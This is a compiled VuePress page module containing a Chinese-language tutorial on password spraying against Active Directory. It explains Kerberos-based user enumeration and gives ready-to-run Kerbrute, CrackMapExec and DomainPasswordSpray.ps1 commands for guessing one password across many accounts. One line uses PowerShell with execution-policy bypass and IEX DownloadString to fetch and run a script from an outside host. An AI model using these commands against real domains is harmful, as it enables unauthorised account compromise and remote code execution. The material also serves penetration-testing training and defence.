import{_ as n,W as r,X as t,Y as a,Z as s,a0 as p,a1 as l,C as i}from"./framework-b6a07282.js";const c={},o=a("h2",{id:"密码喷洒-password-spraying-攻击",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#密码喷洒-password-spraying-攻击","aria-hidden":"true"},"#"),s(" 密码喷洒（Password Spraying）攻击")],-1),d=a("h3",{id:"kerbrute域内用户枚举",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#kerbrute域内用户枚举","aria-hidden":"true"},"#"),s(" Kerbrute域内用户枚举")],-1),u=a("li",null,[a("p",null,"正常域用户登录主机，可以通过net user /domain来列出域内所有用户。")],-1),m=a("li",null,[a("p",null,"非域用户登录无法使用命令来列出域内用户的，或者当主机不在域内但是能够与域控通信时，可以通过Kerbrute枚举用户来获取域内用户名。")],-1),b={href:"https://github.com/byt3bl33d3r/CrackMapExec",target:"_blank",rel:"noopener noreferrer"},h=l(`<p>原理：在Kerberos协议认证的第一阶段AS-REQ，当用户名不存在时，返回包提示错误，当用户存在时，密码正确或密码错误，AS-REQ的返回包不一样。所以可以通过利用这点，对域内进行域用户枚举和密码喷洒攻击。在AS-REQ阶段客户端向AS发送用户名，AS对用户名进行验证，用户存在和不存在返回的数据包不一样，所以，根据AS的返回包来对域用户进行枚举。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#使用的是域外用户，爆破域内用户用户名</span>
shell kerbrute.exe userenum <span class="token parameter variable">--dc</span> 域控IP地址 <span class="token parameter variable">-d</span> 域名 字典文件路径
shell kerbrute.exe userenum <span class="token parameter variable">--dc</span> <span class="token number">192.168</span>.1.1 <span class="token parameter variable">-d</span> hacker.com top500.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="密码喷洒攻击" tabindex="-1"><a class="header-anchor" href="#密码喷洒攻击" aria-hidden="true">#</a> 密码喷洒攻击</h3><h4 id="kerbrute" tabindex="-1"><a class="header-anchor" href="#kerbrute" aria-hidden="true">#</a> Kerbrute</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#使用单个密码去碰撞多个用户</span>
shell kerbrute.exe passwordspray <span class="token parameter variable">-d</span> 域控IP地址 字典 密码
shell kerbrute.exe passwordspray <span class="token parameter variable">-d</span> hacker.com top500.txt Aa123456
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="cracmapexec" tabindex="-1"><a class="header-anchor" href="#cracmapexec" aria-hidden="true">#</a> CracMapExec</h4><ul><li>CrackMapExec（CME）是一款Kail LInux默认安装好的，非常好用的密码喷洒工具。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>crackmapexec smb 域控IP <span class="token parameter variable">-u</span> 用户名字典 <span class="token parameter variable">-p</span> <span class="token string">&#39;密码&#39;</span> --continue-on-sucess
crackmapexec smb <span class="token number">192.168</span>.1.1 <span class="token parameter variable">-u</span> top500.txt <span class="token parameter variable">-p</span> <span class="token string">&#39;Aa123456&#39;</span> --continue-on-success <span class="token operator">|</span> <span class="token function">grep</span> + <span class="token comment">#过滤登录失败的</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="domainpasswordspray-ps1" tabindex="-1"><a class="header-anchor" href="#domainpasswordspray-ps1" aria-hidden="true">#</a> DomainPasswordSpray.ps1</h4><ul><li>只有域内用户可用</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>import-Module DomainPasswordSpray.ps1
powershell-import DomainPasswordSpray.ps1 <span class="token comment">#导入文件</span>


powershell Invoke-DomainPasswordSpray <span class="token parameter variable">-UserList</span> C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>win7<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>top500.txt <span class="token parameter variable">-Domain</span> hacker.com <span class="token parameter variable">-Password</span> Aa123456 <span class="token parameter variable">-Force</span> <span class="token parameter variable">-OutFile</span> res.txt

shell powershell <span class="token parameter variable">-exec</span> bypass <span class="token parameter variable">-c</span> IEX <span class="token punctuation">(</span>New-Object System.Net.Webclient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">&#39;http://192.168.1.253:8080/DomainPasswordSpray.ps1&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>import-module .<span class="token punctuation">\\</span>DomainPasswordSpray.ps1<span class="token punctuation">;</span>Invoke-DomainPasswordSpray <span class="token parameter variable">-UserList</span> C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>win7<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>top500.txt <span class="token parameter variable">-Domain</span> hacker.com <span class="token parameter variable">-Password</span> Aa123456 <span class="token parameter variable">-Force</span> <span class="token parameter variable">-OutFile</span> res.txt <span class="token comment">#远程执行</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11);function k(v,x){const e=i("ExternalLinkIcon");return r(),t("div",null,[o,d,a("ul",null,[u,m,a("li",null,[a("p",null,[a("a",b,[s("https://github.com/byt3bl33d3r/CrackMapExec"),p(e)])])])]),h])}const g=n(c,[["render",k],["__file","密码喷洒攻击.html.vue"]]);export{g as default};
